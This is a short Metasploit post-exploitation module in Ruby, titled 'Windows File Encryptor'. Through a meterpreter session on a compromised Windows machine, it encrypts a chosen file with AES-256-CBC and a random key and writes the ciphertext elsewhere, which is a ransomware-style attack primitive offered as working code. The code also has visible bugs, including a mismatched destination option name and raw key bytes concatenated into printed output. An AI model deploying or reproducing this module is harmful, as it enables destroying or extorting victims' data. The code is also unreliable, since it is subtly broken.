##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File  
  require 'openssl'
  require 'msf/core'

  def initialize(info = {})
    super(update_info(info,
        'Name'          => 'Windows File Encryptor',
        'Description'   => %q{
          This module will encrypt a target file.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Galapag0s' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))
    register_options(
    [
	OptString.new('PATH', [ true, 'Specify a file to be encrypted.', 'C:\\User\\' ]),
	OptString.new('DEST', [ true, 'Specify a destination for the encrypted file.', 'C:\\Temp' ]),
    ], self.class)
    end

  def run
    #Check if file exists
    filepathvar = datastore['PATH']
    destpath = datastore['DESTINATION']
    if exist?(filepathvar)
        cipher = OpenSSL::Cipher.new('aes-256-cbc')
	cipher.encrypt
	key = cipher.random_key
	print_good('The Key Is: ' + key)
	iv = cipher.random_iv
	print_good('The IV Is: ' + iv)
	
	buffer = read_file(filepathvar)
	outf = ''
	outf << cipher.update(buffer)
	outf << cipher.final
	write_file(destpath,outf)
    else
    #If file doesn't exist throw an error
        print_error('Cannot read specified file.')
    end
  end
end
